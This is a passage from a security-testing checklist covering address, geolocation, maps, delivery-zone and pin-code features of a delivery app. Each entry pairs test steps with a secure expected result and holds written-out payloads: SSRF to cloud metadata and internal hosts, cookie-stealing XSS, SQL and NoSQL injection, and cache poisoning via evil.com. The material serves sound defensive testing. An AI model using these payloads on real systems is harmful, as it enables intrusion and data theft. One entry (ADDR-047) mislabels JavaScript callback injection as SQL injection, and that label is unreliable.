**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Intercept the geolocation data sent to the server. 2. Modify coordinates to a location with lower delivery fees or different tax rates. 3. Check if pricing changes based on spoofed location.

**Expected Result:** Application must validate location data against the confirmed delivery address and not use raw client geolocation for pricing.

**Payload Example:**

```
Change lat=40.7128&lng=-74.0060 to coordinates of a tax-free zone or free-delivery area
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-038 — Geolocation Permission Bypass
**Test Category:** Client-Side (WSTG-CLNT-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Deny geolocation permission in browser. 2. Check if the application has fallback mechanisms that leak location via IP geolocation or other means. 3. Verify privacy is respected.

**Expected Result:** Application must gracefully handle denied geolocation permissions without using alternative tracking methods and allow manual address entry.

**Payload Example:**

```
Deny browser geolocation prompt and monitor for IP-based geolocation API calls or hidden location tracking
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-039 — SSRF via Geolocation Reverse Geocoding
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. If application performs reverse geocoding by sending coordinates to an API intercept the request. 2. Check if the geocoding service URL is client-controllable. 3. Test for SSRF.

**Expected Result:** Application must hardcode geocoding service URLs and not accept client-provided reverse geocoding endpoints.

**Payload Example:**

```
Change geocoding_url to http://127.0.0.1:8080 or http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADDR-040 — Geolocation Data Stored Without Consent
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Trigger auto-detect location. 2. Check backend storage and database for persisted location data. 3. Verify if user consent was obtained and if data retention policies are followed.

**Expected Result:** Application must obtain explicit user consent before storing geolocation data and adhere to data retention and privacy policies.

**Payload Example:**

```
Review database for stored coordinates; check for consent mechanism before geolocation API call
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Manual Database Review

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ADDR-041 — XSS via Geolocation Response Display
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. If the application displays the auto-detected location name to the user intercept the geolocation API response. 2. Inject XSS payload in the location name. 3. Check if it renders.

**Expected Result:** Application must encode all location data before displaying it to users regardless of the data source.

**Payload Example:**

```
Intercept reverse geocoding response and change location_name to <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;MitM Proxy

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-042 — Replay Attack with Old Geolocation Data
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Capture a geolocation submission request with valid coordinates. 2. Replay the same request later from a different actual location. 3. Check if old location data is accepted without re-verification.

**Expected Result:** Application must timestamp geolocation data and require periodic refresh rather than accepting stale location information.

**Payload Example:**

```
Replay captured POST /api/location/detect with old coordinates after physically moving to different location
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADDR-043 — Google Maps API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Inspect page source and JavaScript files for Google Maps API keys. 2. Check if the key is exposed in client-side code. 3. Test if the key has proper restrictions.

**Expected Result:** Google Maps API keys must be restricted to specific referrers and APIs and not be exposed without proper access controls.

**Payload Example:**

```
Search page source for AIzaSy or maps.googleapis.com?key= in JS files and HTML
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;GitLeaks;TruffleHog

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-044 — Unrestricted Google Maps API Key Abuse
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Extract the Google Maps API key from client-side code. 2. Use the key to make unauthorized API calls like Directions or Places or Geocoding. 3. Check if the key works without referrer restrictions.

**Expected Result:** Google Maps API key must be restricted to specific domains and APIs and usage must be monitored and capped.

**Payload Example:**

```
curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key=EXTRACTED_KEY'
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** cURL;Postman;KeyHacks

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADDR-045 — Google Maps JavaScript API XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. If custom markers or info windows use user-provided data inject XSS payloads. 2. Check if the payload renders in map info windows or popups.

**Expected Result:** Application must sanitize all user data before displaying it in Google Maps info windows or custom overlays.

**Payload Example:**

```
Set address_label=<img src=x onerror=alert(document.cookie)> and check if it renders in map marker popup
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-046 — SSRF via Maps Proxy Endpoint
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. If the application proxies Google Maps requests through its own server intercept the proxy request. 2. Modify the destination URL to an internal service. 3. Check for SSRF.

**Expected Result:** Application must validate and whitelist URLs when proxying map requests and block access to internal networks.

**Payload Example:**

```
Change /api/maps/proxy?url=https://maps.googleapis.com/... to url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADDR-047 — Maps Callback Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. If Google Maps API uses a callback parameter inject JavaScript code. 2. Check if the callback value is reflected without sanitization.

**Expected Result:** Application must validate callback function names against a whitelist and reject any containing special characters.

**Payload Example:**

```
callback=alert(1)// or callback=eval(atob('payload')) in maps API callback parameter
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-048 — Clickjacking on Map Interface
**Test Category:** Clickjacking (WSTG-CLNT-09) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Create a page that iframes the application's map page. 2. Overlay invisible elements to capture user clicks. 3. Check if the map page can be framed and interacted with.

**Expected Result:** Application must implement X-Frame-Options and CSP frame-ancestors to prevent the map interface from being framed.

**Payload Example:**

```
<iframe src='https://target.com/address/map' style='opacity:0.1;position:absolute'></iframe>
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;Browser

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## ADDR-049 — Map Data Injection for Address Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Use the map to select a delivery address. 2. Intercept the coordinates sent to the server. 3. Modify coordinates to a different location while keeping the displayed address. 4. Check if the spoofed coordinates are accepted.

**Expected Result:** Application must reverse-geocode submitted coordinates server-side and validate them against the provided text address.

**Payload Example:**

```
Change lat=40.7128&lng=-74.0060 to lat=0.0&lng=0.0 while keeping text_address as New York address
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-050 — Information Leakage via Maps API Calls
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Monitor all Google Maps API calls made by the application. 2. Check if sensitive user data like exact home location or search history is sent to Google. 3. Review query parameters.

**Expected Result:** Application must minimize data shared with third-party map services and inform users about data sharing practices.

**Payload Example:**

```
Monitor network requests to maps.googleapis.com for user-identifiable data in parameters
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-051 — Type Manipulation to Bypass Restrictions
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multiple Address Types (Home/Work)

**Test Steps:** 1. Add an address with type=home. 2. Intercept the request and change address_type to a non-standard value like admin or warehouse or internal. 3. Check if the application accepts it.

**Expected Result:** Application must validate address_type against a predefined whitelist of allowed types.

**Payload Example:**

```
Change address_type=home to address_type=admin or address_type=warehouse or address_type=internal
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-052 — Exceeding Maximum Address Count Per Type
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multiple Address Types (Home/Work)

**Test Steps:** 1. Check if there is a limit on addresses per type. 2. Add more addresses than allowed for a single type. 3. Bypass frontend limits via API. 4. Check for storage abuse.

**Expected Result:** Application must enforce maximum address count limits per type server-side.

**Payload Example:**

```
Send 100+ POST /api/addresses requests all with address_type=home via API bypassing UI limit
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-053 — SQL Injection in Address Type Filter
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multiple Address Types (Home/Work)

**Test Steps:** 1. Use the filter to view addresses by type. 2. Inject SQL payload in the type parameter. 3. Observe the response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for filtering addresses by type.

**Payload Example:**

```
GET /api/addresses?type=' OR 1=1--;GET /api/addresses?type=home' UNION SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-054 — XSS via Custom Address Type Label
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Multiple Address Types (Home/Work)

**Test Steps:** 1. If users can create custom address type labels inject XSS payload as the label. 2. Save and view the address list. 3. Check if the payload executes.

**Expected Result:** Application must sanitize custom address type labels and encode output when rendering.

**Payload Example:**

```
address_type=<script>alert('XSS')</script> or address_label=<img/src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-055 — IDOR on Viewing Specific Address Type for Another User
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multiple Address Types (Home/Work)

**Test Steps:** 1. Filter addresses by type for own account. 2. Change user_id parameter to another user. 3. Check if another user's home or work addresses are disclosed.

**Expected Result:** Application must verify ownership before returning any address data regardless of filter criteria.

**Payload Example:**

```
GET /api/addresses?user_id=1002&type=home using User A authentication
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-056 — Address Type Change Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multiple Address Types (Home/Work)

**Test Steps:** 1. Change the type of an existing address from home to work. 2. Intercept and modify the address_id to another user's address. 3. Check if the type is changed for the other user.

**Expected Result:** Application must validate address ownership before allowing type changes.

**Payload Example:**

```
PUT /api/addresses/ADDR-2001/type with type=work using non-owner credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-057 — Delivery Zone Bypass via Coordinate Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Select a delivery address outside the service zone. 2. Intercept the request and modify the coordinates or zone_id to a serviceable zone. 3. Check if delivery is accepted for the out-of-zone address.

**Expected Result:** Application must validate delivery zone eligibility server-side based on the actual address and not trust client-provided zone identifiers.

**Payload Example:**

```
Change zone_id=OUT_OF_ZONE to zone_id=SERVICEABLE or modify coordinates to within-zone values
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-058 — SQL Injection in Zone Lookup
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Use the delivery zone validation endpoint. 2. Inject SQL payloads in the zip_code or zone_id parameter. 3. Observe for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all delivery zone database lookups.

**Payload Example:**

```
GET /api/delivery-zones/check?zip=' OR 1=1--;GET /api/delivery-zones?zone_id=1' UNION SELECT * FROM zones--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-059 — Zone Validation Bypass for Free Delivery
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Check if certain zones have free delivery. 2. Intercept the zone validation response. 3. Change zone classification from paid to free. 4. Check if free delivery is applied.

**Expected Result:** Application must determine delivery fees server-side based on validated zone data and not accept client-modified zone classifications.

**Payload Example:**

```
Intercept response and change {"zone":"paid_delivery";"fee":9.99} to {"zone":"free_delivery";"fee":0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-060 — Delivery Zone Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Send requests with various zip codes or zone identifiers. 2. Note differences in responses for valid vs invalid zones. 3. Enumerate all serviceable zones.

**Expected Result:** Application must not reveal detailed zone configuration information through validation responses.

**Payload Example:**

```
Enumerate GET /api/delivery-zones/check?zip=00001 through zip=99999 and map serviceable areas
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ADDR-061 — Zone Restriction Bypass for Restricted Products
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Order a product restricted to certain delivery zones. 2. Intercept the order request and change the delivery zone to an allowed zone. 3. Change shipping address back to restricted zone after validation.

**Expected Result:** Application must validate zone restrictions at every stage including final order processing not just initial validation.

**Payload Example:**

```
Pass zone validation with allowed zone then modify shipping address to restricted zone before final submit
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-062 — Rate Limiting on Zone Validation Endpoint
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Send rapid zone validation requests with different addresses. 2. Check if rate limiting is enforced. 3. Attempt to map entire delivery zone coverage.

**Expected Result:** Application must implement rate limiting on zone validation to prevent abuse and data scraping.

**Payload Example:**

```
Send 500+ GET /api/delivery-zones/check requests per minute with varying zip codes
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ADDR-063 — Cross-Zone Pricing Exploitation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Get pricing for delivery in zone A. 2. Change zone to zone B which has lower delivery fees. 3. Submit order with zone B pricing but zone A address.

**Expected Result:** Application must recalculate delivery fees based on the actual validated address at order confirmation.

**Payload Example:**

```
Get delivery_fee from zone B then submit order with zone A address keeping zone B fee
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-064 — SQL Injection in Pin Code Lookup
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Use the pin code lookup feature. 2. Inject SQL payloads in the pin_code or zip_code parameter. 3. Observe the response for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for all pin code and zip code database lookups.

**Payload Example:**

```
GET /api/pincode/lookup?code=' OR 1=1--;GET /api/zipcode?zip=12345' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-065 — XSS via Pin Code Lookup Response
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Enter a pin code in the lookup field. 2. If the response includes the input in the page check for reflected XSS. 3. Inject XSS payload as the pin code value.

**Expected Result:** Application must encode all reflected values in pin code lookup responses to prevent XSS.

**Payload Example:**

```
pincode=<script>alert(1)</script> or zip="><img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-066 — Pin Code Enumeration for Location Mapping
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Enumerate all pin codes via the lookup API. 2. Map the responses to build a database of serviceable areas. 3. Check if sensitive location details are exposed.

**Expected Result:** Application must rate-limit pin code lookups and not expose sensitive information like exact delivery capabilities per zone.

**Payload Example:**

```
Enumerate GET /api/pincode/lookup?code=100001 through code=999999
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ADDR-067 — Invalid Pin Code Format Handling
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Enter various invalid formats in pin code field like alphabets or special characters or negative numbers or extremely long values. 2. Check for error disclosure or crashes.

**Expected Result:** Application must validate pin code format server-side against expected patterns and return user-friendly error messages.

**Payload Example:**

```
zip=ABCDEF;zip=-12345;zip=12345678901234567890;zip=!@#$%^;zip=null;zip=undefined
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-068 — SSRF via Pin Code Validation Service
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. If pin code validation calls an external service intercept the request. 2. Modify the service URL if controllable. 3. Check for SSRF to internal systems.

**Expected Result:** Application must hardcode validation service URLs and not allow client-side manipulation of the service endpoint.

**Payload Example:**

```
Change validation_service_url to http://localhost:6379/ or http://internal-api.local/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADDR-069 — Rate Limiting Bypass on Lookup
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Send rapid pin code lookup requests. 2. If rate limited try bypassing with X-Forwarded-For or X-Real-IP header manipulation. 3. Check if bypass works.

**Expected Result:** Application must implement rate limiting that cannot be bypassed via header manipulation.

**Payload Example:**

```
Add X-Forwarded-For: 1.2.3.{1-255} to bypass IP-based rate limiting on /api/pincode/lookup
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ADDR-070 — Pin Code Lookup Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Perform pin code lookup and examine the full API response. 2. Check for excessive data exposure like warehouse locations or delivery partner details or internal zone codes.

**Expected Result:** Application must return only necessary information in pin code lookup responses without exposing internal operational data.

**Payload Example:**

```
Check response for fields like warehouse_id;delivery_partner;internal_zone;capacity;manager_contact
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-071 — NoSQL Injection in Pin Code Lookup
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. If backend uses NoSQL inject NoSQL operators in the pin code parameter. 2. Check for data extraction or authentication bypass.

**Expected Result:** Application must sanitize pin code inputs against NoSQL injection patterns.

**Payload Example:**

```
GET /api/pincode/lookup?code[$ne]=null or code[$gt]=000000 or code[$regex]=.*
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** Burp Suite;NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## ADDR-072 — Cache Poisoning via Pin Code Lookup
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Send pin code lookup request with manipulated headers to poison cache. 2. Check if subsequent users receive the poisoned response. 3. Test with X-Forwarded-Host or custom headers.

**Expected Result:** Application must not cache responses based on user-controllable headers and must implement proper cache key validation.

**Payload Example:**

```
Add X-Forwarded-Host: evil.com to GET /api/pincode/lookup?code=10001 and check if cached response is poisoned
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ADDR-073 — Unicode and IDN Injection in Address Fields
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Enter addresses with Unicode characters and internationalized domain names in fields. 2. Include right-to-left override characters and homoglyph attacks. 3. Check for rendering issues or injection.

